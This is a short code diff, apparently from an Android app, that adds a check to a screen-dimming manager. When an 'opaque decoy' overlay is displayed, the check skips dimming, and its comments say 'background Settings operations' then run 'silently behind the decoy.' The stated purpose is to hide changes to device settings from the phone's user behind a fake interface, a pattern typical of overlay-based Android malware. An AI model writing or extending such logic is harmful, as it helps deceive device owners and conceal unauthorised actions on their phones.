@@ -18,6 +18,15 @@ object DimmerManager {
             DebugLogger.log("DIMMER_LIFECYCLE", "applyDim BLOCKED by Safe Zone.")
             return
         }
+        
+        // --- COGNITIVE OVERLAY SHIELD ---
+        // If an opaque decoy overlay is already displayed on top, we don't need a black blindfold.
+        // The background Settings operations will be completed silently behind the decoy.
+        if (level == 0 && DynamicUIManager.isAnyAttached) {
+            DebugLogger.log("DIMMER_LIFECYCLE", "applyDim(0) bypassed: Opaque decoy UI is active. Performing background operations silently.")
+            return
+        }
+        
         DebugLogger.log("DIMMER_LIFECYCLE", "applyDim called -> targetLevel: $level, method: $preferredMethod")
         lastLevel = level
         val safeLevel = level.coerceIn(0, 100)
